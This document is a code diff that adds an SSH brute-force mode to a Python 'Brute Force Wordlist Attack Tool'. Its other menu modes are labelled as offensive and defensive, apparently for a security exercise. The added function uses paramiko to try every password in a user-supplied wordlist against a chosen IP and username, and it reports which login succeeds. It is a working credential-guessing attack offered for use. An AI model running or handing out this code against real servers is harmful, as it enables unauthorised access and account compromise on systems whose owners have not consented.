@@ -1,5 +1,6 @@
 import time
 import getpass
+import paramiko  # Import the Paramiko library
 
 # Part 1: Dictionary Iterator Function (Mode 1)
 def dictionary_iterator():
@@ -43,6 +44,28 @@ def password_complexity():
     else:
         print("FAILURE: The password does not meet all requirements.")
 
+# Part 4: SSH Brute Force Function (Mode 4)
+def ssh_brute_force():
+    ip = input("Enter the IP address of the SSH server: ")
+    username = input("Enter the username: ")
+    filepath = input("Enter your dictionary filepath:\n")
+
+    with open(filepath, 'r', errors='ignore') as file:
+        for line in file:
+            password = line.strip()
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            try:
+                ssh.connect(ip, username=username, password=password)
+                print(f"SUCCESS: SSH login successful with password '{password}'")
+                break
+            except paramiko.AuthenticationException:
+                print(f"FAILED: SSH login failed with password '{password}'")
+            except paramiko.SSHException as e:
+                print(f"Error: {e}")
+            finally:
+                ssh.close()
+
 # Main Function
 if __name__ == "__main__":
     while True:
@@ -51,7 +74,8 @@ Brute Force Wordlist Attack Tool Menu
 1 - Offensive, Dictionary Iterator
 2 - Defensive, Password Recognized
 3 - Defensive, Password Complexity
-4 - Exit
+4 - SSH Brute Force
+5 - Exit
 Please enter a number: 
 """)
         if mode == "1":
@@ -61,12 +85,11 @@ Please enter a number:
         elif mode == "3":
             password_complexity()
         elif mode == "4":
+            ssh_brute_force()
+        elif mode == "5":
             break
         else:
             print("Invalid selection...")
-
-
-
 
 
 # Sources: 
